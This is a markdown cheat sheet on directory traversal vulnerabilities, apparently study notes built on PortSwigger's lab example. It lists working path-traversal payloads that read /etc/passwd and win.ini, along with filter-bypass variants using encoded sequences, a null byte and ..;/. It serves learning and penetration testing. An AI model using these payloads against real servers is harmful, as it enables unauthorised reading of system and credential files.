 # Directory traversal

> Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

## Summary
- [Directory traversal](#directory-traversal)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [Basic Injections](#basic-injections)
      - [Unix-based OS](#unix-based-os)
      - [Windows](#windows)
      - [Bypass "../" filter with "....//" or "....\ /"](#bypass-%22%22-filter-with-%22%22-or-%22-%22)
      - [Bypass "../" filter with ..%c0%af or ..%252f](#bypass-%22%22-filter-with-c0af-or-252f)
      - [Using full path](#using-full-path)
      - [Bypass with null byte](#bypass-with-null-byte)
      - [Double URL encoding](#double-url-encoding)
      - [Bypass "../" filter with ";"](#bypass-%22%22-filter-with-%22%22)
  - [References](#references)

## Exploits
:fire: **example:**

> Consider a shopping application that displays images of items for sale. Images are loaded via some HTML like the following:

```bash
<img src="/loadImage?filename=218.png">
```
>The loadImage URL takes a filename parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location /var/www/images/. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In the above case, the application reads from the following file path:

>/var/www/images/218.png 

if you right click on image in your browser then => view image you may get a link like this
```bash
https://sub.web-security-academy.net/image?filename=218.png
```
>The application implements no defenses against directory traversal attacks, so an attacker can request the following URL to retrieve an arbitrary file from the server's filesystem: 

```bash
https://sub.web-security-academy.net/image?filename=../../../etc/passwd
```

### Basic Injections
**note**
```bash
/ = Root directory
../ = Parent of current directory
../../ = Two directories backwards
../../../ = three directories backwards
```

#### Unix-based OS

```bash
/etc/passwd 
../../../etc/passwd 
```

#### Windows

> both ../ and ..\ are valid directory traversal sequences

```bash
..\..\..\windows\win.ini
```
### Bypass "../" filter with "....//" or "....\ /"

```bash
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```
### Bypass "../" filter with ..%c0%af or ..%252f

```bash
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
```
### Using full path 
```bash
/var/www/images/../../../etc/passwd
```

### Bypass with null byte

```bash
../../../etc/passwd%00.png
```

### Double URL encoding

```bash
. = %252e
/ = %252f
\ = %255c
```

### Bypass "../" filter with ";"

```bash
..;/
```


## References
* [Portswigger](https://portswigger.net/web-security/file-path-traversal)

* [PayloadsAllTheThings - By swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
* [@Jhaddix](https://twitter.com/Jhaddix/status/1235161881301512194)
